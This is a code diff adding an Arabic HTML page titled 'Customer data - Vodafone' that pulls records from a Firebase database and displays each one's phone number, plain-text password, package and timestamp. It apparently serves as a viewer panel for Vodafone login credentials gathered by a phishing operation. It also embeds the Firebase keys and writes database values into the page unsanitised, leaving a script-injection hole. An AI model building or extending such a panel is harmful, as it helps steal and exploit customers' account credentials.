@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>بيانات العملاء - Vodafone</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(to bottom, #1a1a1a, #4a0000);
+      color: white;
+    }
+
+    .container {
+      padding: 30px 20px;
+      max-width: 900px;
+      margin: auto;
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 28px;
+    }
+
+    .data-box {
+      background-color: rgba(255, 255, 255, 0.05);
+      border: 1px solid #ff4d4d;
+      border-radius: 10px;
+      padding: 15px 20px;
+      margin-bottom: 15px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+    }
+
+    .data-box p {
+      margin: 5px 0;
+      font-size: 15px;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 40px;
+      font-size: 14px;
+      color: #ffcccc;
+      opacity: 0.7;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>بيانات العملاء - Vodafone</h1>
+    <div id="dataContainer">جاري تحميل البيانات...</div>
+
+    <div class="footer">
+      &copy; Mahmoud Gamal Programming
+    </div>
+  </div>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
+      authDomain: "starkoscript.firebaseapp.com",
+      databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
+      projectId: "starkoscript",
+      storageBucket: "starkoscript.appspot.com",
+      messagingSenderId: "381525854892",
+      appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const container = document.getElementById("dataContainer");
+
+    db.ref("voda").on("value", snapshot => {
+      container.innerHTML = "";
+      const data = snapshot.val();
+      if (!data) {
+        container.innerHTML = "<p>لا توجد بيانات حالياً</p>";
+        return;
+      }
+
+      Object.values(data).reverse().forEach(entry => {
+        const div = document.createElement("div");
+        div.className = "data-box";
+        div.innerHTML = `
+          <p><strong>الرقم:</strong> ${entry.num}</p>
+          <p><strong>كلمة المرور:</strong> ${entry.pass}</p>
+          <p><strong>الباقة:</strong> ${entry.pack}</p>
+          <p><strong>الوقت:</strong> ${entry.time}</p>
+        `;
+        container.appendChild(div);
+      });
+    });
+  </script>
+</body>
+</html>
